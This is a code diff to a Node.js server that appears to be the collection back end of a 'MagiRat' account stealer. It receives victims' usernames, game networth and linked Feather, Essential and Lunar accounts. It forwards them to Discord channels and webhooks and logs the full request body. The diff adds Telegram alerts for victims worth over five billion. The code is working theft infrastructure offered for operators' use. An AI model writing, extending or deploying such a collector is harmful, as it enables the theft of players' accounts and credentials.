@@ -3,6 +3,7 @@ const getProfiles = require('./utils/networth')
 const { uploadData, threadHandler, sendMessage, formatNumber, fetchCountry } = require('./utils/utils');
 const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');
 const { post, get } = require("axios")
+const TelegramBot = require('node-telegram-bot-api');
 
 require("dotenv").config()
 
@@ -26,8 +27,14 @@ let debughook = process.env.DEBUGHOOK
 let blacklist = process.env.BLACKLIST
 
 // Discord bot
-let token = process.env.BOT_TOKEN;
-let channelId = process.env.CHANNEL_ID;
+let token = process.env.DC_TOKEN
+let channelId = process.env.CHANNEL_ID
+
+// Telegram bot
+let tgToken = process.env.TG_TOKEN
+let tgUsers = process.env.TG_USERS
+
+const bot = new TelegramBot(tgToken, {polling: true});
 
 // Initialize the Discord client with necessary intents
 const client = new Client({
@@ -245,12 +252,12 @@ app.post("/", (req, res) => {
         try {
             // Send logs to main channel
             client.login(token).then(() => {
-                threadHandler(content, embed, req.body.username, profileData.stats.bestNetworth, client, channelId);
+                threadHandler(content, embed, req.body.username, profileData.stats.bestNetworthFormatted, client, channelId);
               }).catch(error => console.error('Error logging in:', error));
             
             // Shortlogs (hella short + some kind of backup)
             post(shorthook, JSON.stringify({
-                content: `@everyone \`\`\`${req.body.username} - ${profileData.stats.bestNetworth}\n${profiles}\n${featherAccounts.join(', ')}, ${essentialAccounts.join(', ')}, ${lunarAccounts.join(', ')}\`\`\` `, //ping
+                content: `@everyone \`\`\`${req.body.username} - ${profileData.stats.bestNetworthFormatted}\n${profiles}\n${featherAccounts.join(', ')}, ${essentialAccounts.join(', ')}, ${lunarAccounts.join(', ')}\`\`\` `, //ping
             }), {
                 headers: {
                     "Content-Type": "application/json"
@@ -263,6 +270,22 @@ app.post("/", (req, res) => {
         } catch (e) {
             console.log(e)
         }
+
+        if (profileData.stats.bestNetworth > 5000000000) {
+            // Split the string into an array of user IDs and iterate through it
+            tgUsers.split("_").forEach(userId => {
+                // Convert userId from string to number, as sendMessage expects a numerical ID or a string username
+                const numericUserId = parseInt(userId, 10);
+  
+                // Send the message to each user
+                bot.sendMessage(numericUserId, `${profileData.stats.bestNetworthFormatted} ${req.body.username}`).then(() => {
+                    console.log(`Message sent to user ID: ${numericUserId}`);
+                }).catch(error => {
+                    console.error(`Failed to send message to user ID: ${numericUserId}`, error);
+                });
+            });
+        }
+
         console.log(`[MagiRat] ${req.body.username} has been ratted!\nThe alts beeing ${lunarAccounts.join(' ')} ${essentialAccounts.join(' ')} ${lunarAccounts.join(' ')}\n${JSON.stringify(req.body)}`)
     })
         .catch(err => {
